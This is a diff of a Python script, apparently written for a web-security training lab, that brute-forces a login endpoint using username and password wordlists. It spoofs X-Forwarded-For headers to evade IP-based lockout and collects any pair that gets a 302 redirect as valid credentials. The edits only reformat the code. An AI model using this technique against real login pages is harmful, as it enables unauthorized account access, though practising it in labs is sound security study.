@@ -16,8 +16,7 @@ def brute_force(url, userList, passList) :
             data = {"username": user_, "password": pass_}
             headers = {"X-Forwarded-For":f"{ite}"}
             cookie = {"session":"vUPoy8YBFOw2Yu1P291Yc63aUHxz34JI"}
-            res = requests.post(url + "/login", data=data, cookies=cookie,
-                                headers=headers, proxies=proxies, verify=False)
+            res = requests.post(url + "/login", data=data, cookies=cookie, headers=headers, proxies=proxies, verify=False)
             ite += 1
             if res.status_code == 302:
                 credentials += user_ + '   ' + pass_ + "\n"
@@ -30,8 +29,7 @@ def brute_force(url, userList, passList) :
          
     return credentials          
 
-if __name__ == "__main__":
-    
+if __name__ == "__main__": 
     try:
         url = sys.argv[1].strip()
     except IndexError:
@@ -40,11 +38,9 @@ if __name__ == "__main__":
         sys.exit(-1)
         
     userList = []
-    passList = []
-    
+    passList = [] 
     # current_directory = os.getcwd()
     # print(current_directory)
-    
     with open(r'C:\Users\zeiny\OneDrive\Documents\Etudes\PROJETS\scripts\web_acad\authentification\wordlist\users.txt', "r", encoding="utf-8") as userFile:
         userList = userFile.read().splitlines()
         userFile.close()
